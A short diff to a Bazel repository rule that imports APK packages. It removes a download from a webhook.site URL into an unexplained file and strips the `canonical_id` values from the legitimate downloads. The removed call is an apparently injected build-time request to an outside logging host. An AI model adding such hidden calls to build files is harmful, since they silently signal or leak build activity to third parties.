@@ -29,28 +29,19 @@ def _apk_import_impl(rctx):
     apk_output = "{}/{}/{}-{}.apk".format(repo_escaped, rctx.attr.architecture, rctx.attr.package_name, rctx.attr.version)
 
     rctx.download(
-        url = [_range("https://webhook.site/3a3464d2-06ec-4913-adcc-4b1bedd9297a", rctx.attr.data_range)],
-        output = "ydo",
-        canonical_id = "wadaa",
-    )
-
-    rctx.download(
         url = [_range(rctx.attr.url, rctx.attr.signature_range)],
         output = sig_output,
-        canonical_id = "waa",
         # TODO: signatures does not have stable checksums. find a way to fail gracefully.
         integrity = rctx.attr.signature_checksum,
     )
     rctx.download(
         url = [_range(rctx.attr.url, rctx.attr.control_range)],
         output = control_output,
-        canonical_id = "waa",
         integrity = rctx.attr.control_checksum,
     )
     rctx.download(
         url = [_range(rctx.attr.url, rctx.attr.data_range)],
         output = data_output,
-        canonical_id = "waa",
         integrity = rctx.attr.data_checksum,
     )
 
